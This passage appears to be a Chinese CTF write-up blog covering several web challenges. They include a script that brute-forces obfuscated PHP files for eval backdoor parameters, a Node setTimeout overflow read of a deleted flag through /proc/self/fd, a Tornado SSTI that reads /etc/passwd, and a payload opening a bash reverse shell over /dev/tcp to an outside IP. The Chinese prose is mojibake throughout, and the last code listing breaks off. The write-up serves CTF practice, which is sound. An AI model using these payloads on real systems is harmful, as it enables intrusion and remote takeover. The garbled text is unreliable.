python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">0x0242ac02820a</span>)</span><br><span class="line">sec=<span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(sec)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¸©åˆ°å‘äº†ï¼Œpython2çš„ç¯å¢ƒï¼ï¼ï¼</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222164000955.png" alt="image-20241222164000955"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222163953824.png" alt="image-20241222163953824"></p><p>è¿™é‡Œä¸çŸ¥é“ä¸ºå•¥ä¸èƒ½ç”¨åŸæ¥çš„æ ¼å¼ï¼Œå¥‡æ€ª</p><h2 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223104912732.png" alt="image-20241223104912732"></p><p>ç»™äº†æºç </p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223104936822.png" alt="image-20241223104936822" style="zoom:80%;" /><p>ä¸€å †æ··æ·†è¿‡çš„ä¸çŸ¥é“æ˜¯å•¥çš„æ–‡ä»¶ï¼Œè¶…çº§å¤šã€‚</p><p>æˆ‘ä»¬æ”¾dç›¾è·‘ä¸€ä¸‹</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223105009974.png" alt="image-20241223105009974" style="zoom:80%;" /><p>å‡ ä¹éƒ½æœ‰é—®é¢˜ï¼Œç›´æ¥éšä¾¿æ‰¾ä¸€ä¸ªè¯•è¯•ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223105356197.png" alt="image-20241223105356197"></p><p>æ‰§è¡Œä¸äº†ï¼</p><p>é‚£å°±è·‘è·‘è„šæœ¬ï¼Œæ‰¾å‡ºèƒ½æ‰§è¡Œçš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;å¼€å§‹æ—¶é—´ï¼š &#x27;</span>+ time.asctime(time.localtime(time.time())))</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ§åˆ¶çº¿ç¨‹çš„æœ€å¤§æ•°é‡</span></span><br><span class="line">s1 = threading.Semaphore(<span class="number">100</span>)</span><br><span class="line">filePath=<span class="string">r&#x27;D:\newphpstudy\phpstudy_pro\WWW\src&#x27;</span></span><br><span class="line">os.chdir(filePath)</span><br><span class="line"><span class="comment">#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span></span><br><span class="line">files=os.listdir(filePath)</span><br><span class="line">session=requests.session()</span><br><span class="line"><span class="comment">#è®¾ç½®è¿æ¥çš„æ´»è·ƒçŠ¶æ€ä¸ºfalse</span></span><br><span class="line">session.keep_alive=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">file</span>):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    <span class="comment">#print(&#x27;tring  &#x27; + file + &#x27;   &#x27; + time.asctime(time.localtime(time.time())))</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        gets=<span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>,f.read()))</span><br><span class="line">        posts=<span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>,f.read()))</span><br><span class="line"></span><br><span class="line">    data=&#123;&#125;</span><br><span class="line">    params=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> gets:</span><br><span class="line">        params[i]=<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> posts:</span><br><span class="line">        data[j]=<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    target=<span class="string">&quot;http://127.0.0.1/src/&quot;</span>+file</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(target)</span></span><br><span class="line">    res=session.post(target,data=data,params=params)</span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    res.close()</span><br><span class="line">    res.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;123456&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> gets:</span><br><span class="line">            res=session.get(target+<span class="string">&#x27;?%s=&#x27;</span>%i+<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;123456&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> posts:</span><br><span class="line">                res = session.post(target,data=&#123;j:<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span>&#125;)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;123456&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag==<span class="number">1</span>:</span><br><span class="line">            params=i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            params=j</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &#x27;</span> + file + <span class="string">&quot;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&quot;</span> % params)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ç»“æŸæ—¶é—´ï¼š &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">    t=threading.Thread(target=get_content,args=(f,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223113609841.png" alt="image-20241223113609841"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223113620325.png" alt="image-20241223113620325"></p><p>æ‹¿æäº†ï¼</p><h2 id="prize-p2"><a href="#prize-p2" class="headerlink" title="prize_p2"></a>prize_p2</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; randomBytes &#125; = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fp = <span class="string">&#x27;/app/src/flag.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> flag = <span class="title class_">Buffer</span>(<span class="number">255</span>);</span><br><span class="line"><span class="keyword">const</span> a = fs.<span class="title function_">open</span>(fp, <span class="string">&#x27;r&#x27;</span>, <span class="function">(<span class="params">err, fd</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.<span class="title function_">read</span>(fd, flag, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        fs.<span class="title function_">rm</span>(fp, <span class="function">() =&gt;</span> &#123;&#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(__filename));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/hint&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(flag.<span class="title function_">toString</span>().<span class="title function_">slice</span>(<span class="number">0</span>, <span class="title function_">randomBytes</span>(<span class="number">1</span>)[<span class="number">0</span>]%<span class="number">32</span>));</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// éšæœºæ•°é¢„æµ‹æˆ–è€…ä¸€å¤©ä¹‹å</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/getflag&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">        <span class="keyword">if</span> (a === <span class="title function_">randomBytes</span>(<span class="number">3</span>).<span class="title function_">toString</span>()) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">b</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">b</span>));</span><br><span class="line">            &#125;, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">c</span>)?<span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="number">86400</span>*<span class="number">1000</span>, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">c</span>)):<span class="number">86400</span>*<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å…³é”®ç‚¹åœ¨&#x2F;getflagï¼Œå®ƒå¯ä»¥å‘é€è¯·æ±‚ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fp = <span class="string">&#x27;/app/src/flag.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> flag = <span class="title class_">Buffer</span>(<span class="number">255</span>);</span><br><span class="line"><span class="keyword">const</span> a = fs.<span class="title function_">open</span>(fp, <span class="string">&#x27;r&#x27;</span>, <span class="function">(<span class="params">err, fd</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.<span class="title function_">read</span>(fd, flag, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        fs.<span class="title function_">rm</span>(fp, <span class="function">() =&gt;</span> &#123;&#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>åŒæ—¶ï¼Œæˆ‘ä»¬æ³¨æ„çœ‹è¿™é‡Œ</p><p>&#x2F;app&#x2F;src&#x2F;flag.txt æ–‡ä»¶è¢« open() æ‰“å¼€ï¼Œä½†æœ€ç»ˆæ²¡æœ‰å…³é—­ï¼Œè™½ç„¶åˆ é™¤äº†è¯¥æ–‡ä»¶ï¼Œä½†åœ¨ &#x2F;proc è¿™ä¸ªè¿›ç¨‹çš„ pid ç›®å½•ä¸‹çš„ fd æ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚&#x2F;proc&#x2F;self&#x2F;fd è¿™ä¸ªç›®å½•é‡ŒåŒ…å«äº†è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æƒ…å†µï¼Œç›®å½•é‡Œé¢æœ‰ä¸€å †&#x2F;proc&#x2F;self&#x2F;fd&#x2F;idæ–‡ä»¶ï¼Œidå°±æ˜¯è¿›ç¨‹è®°å½•çš„æ‰“å¼€æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦çš„åºå·ã€‚idå¯çˆ†ç ´çŒœæµ‹è·å¾—ã€‚</p><p>setTimeoutæ˜¯ä½¿ç”¨Int32æ¥å­˜å‚¨å»¶æ—¶å‚æ•°å€¼çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æœ€å¤§çš„å»¶æ—¶å€¼æ˜¯2^31-1ã€‚ ä¸€æ—¦è¶…è¿‡äº†æœ€å¤§å€¼ï¼Œå…¶æ•ˆæœå°±è·Ÿå»¶æ—¶å€¼ä¸º0çš„æƒ…å†µä¸€æ ·ã€‚æ•°ä¸º 2147483648ï¼Œå³å¯å®ç°å»¶æ—¶ä¸º0ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223130449675.png" alt="image-20241223130449675"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223130528458.png" alt="image-20241223130528458"></p><h2 id="NSSCTF-2nd-MyHurricane"><a href="#NSSCTF-2nd-MyHurricane" class="headerlink" title="[NSSCTF 2nd]MyHurricane"></a>[NSSCTF 2nd]MyHurricane</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(__file__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    bl = [<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> bl:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> data.split():</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chunk:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">31</span> &lt; <span class="built_in">ord</span>(c) &lt; <span class="number">128</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IndexHandler</span>(tornado.web.RequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="variable language_">self</span>.finish(f.read())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        data = <span class="variable language_">self</span>.get_argument(<span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(data):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        </span></span><br><span class="line"><span class="string">                        <span class="subst">&#123;data&#125;</span></span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span>)</span><br><span class="line">                f.flush()</span><br><span class="line">            <span class="variable language_">self</span>.render(<span class="string">&#x27;1.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.finish(<span class="string">&#x27;no no no&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">            (<span class="string">r&quot;/&quot;</span>, IndexHandler),</span><br><span class="line">        ], compiled_template_cache=<span class="literal">False</span>)</span><br><span class="line">    app.listen(<span class="number">827</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure><p>ä¸å½±å“è¯»æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssti=&#123;% extends /etc/passwd %&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223165932556.png" alt="image-20241223165932556"></p><p>è¿™é‡Œåº”è¯¥ç›´æ¥éé¢„æœŸäº†ï¼</p><p>æ­£å¸¸æ¥åšï¼Œè¿‡æ»¤äº†æ‹¬å·å¼•å·å•¥çš„ï¼Œç¬”è®°äº†è§£ä¸€ä¸‹</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223170940953.png" alt="image-20241223170940953"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssti=&#123;%set _tt_utf8=eval%&#125;&#123;%raw request.body_arguments[request.method][0]%&#125;&amp;POST=__import__(&#x27;os&#x27;).popen(&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/156.238.233.113/4567 &lt;%261&#x27;&quot;)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223171201655.png" alt="image-20241223171201655"></p><p>é¢ï¼Œè™½ç„¶æœ€åä¹Ÿæ˜¯åœ¨ç¯å¢ƒå˜é‡é‡Œæ‰¾åˆ°flagçš„ã€‚ã€‚ã€‚</p><h2 id="ç¬¬äº”ç©ºé—´-2021-EasyCleanup"><a href="#ç¬¬äº”ç©ºé—´-2021-EasyCleanup" class="headerlink" title="[ç¬¬äº”ç©ºé—´ 2021]EasyCleanup"></a>[ç¬¬äº”ç©ºé—´ 2021]EasyCleanup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123; </span><br><span class="line">    <span class="variable">$shell</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] : <span class="string">&#x27;phpinfo();&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; </span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123; </span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span 